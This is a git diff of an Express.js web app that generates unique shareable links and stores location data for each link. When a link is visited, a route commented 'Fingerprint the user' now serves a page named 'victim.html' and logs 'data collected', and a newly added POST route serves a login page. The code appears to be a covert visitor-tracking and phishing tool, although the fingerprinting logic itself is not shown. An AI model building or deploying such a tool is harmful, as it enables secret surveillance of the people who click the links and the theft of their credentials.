@@ -26,7 +26,7 @@ app.listen(port, () => {
   console.log(`App listening at http://localhost:${port}`);
 });
 
-app.post('/generate', (req, res) => {
+app.post('/generateinner', (req, res) => {
   var id = crypto.randomBytes(20).toString('hex');
   var exploc = req.location;
   sql.query(`INSERT INTO aiData VALUES (?,?,?,?)`, [id, 0, "", exploc], (err) => {
@@ -36,6 +36,10 @@ app.post('/generate', (req, res) => {
     }
   })
   res.send('http://www.unsicher.us/'+id)
+})
+
+app.get('/generator', (req, res) => {
+  res.sendFile('dashboard_gen.html')
 })
 
 app.get('/view/:id', (req, res) => {
@@ -78,6 +82,7 @@ app.get('/view/:id', (req, res) => {
               }
               
               res.send(rows3[0])
+              
             })
          });
       }
@@ -85,6 +90,10 @@ app.get('/view/:id', (req, res) => {
   })
     })
 });
+
+app.get('/viewer/:id', (req, res) => {
+  res.sendFile('dashboard_result.html')
+})
 
 app.get('/:id', async (req,res) => {
   // Fingerprint the user
@@ -129,6 +138,10 @@ app.get('/:id', async (req,res) => {
     }).on('error', err => {
       console.log(err)
   })
-  // res.sendFile("victim.html")
-  res.send("Hi, hope you enjoy sharing")
+  res.sendFile("victim.html")
+  console.log("data collected")
+})
+
+app.post('/', (req, res) => {
+  res.sendFile('login.html')
 })
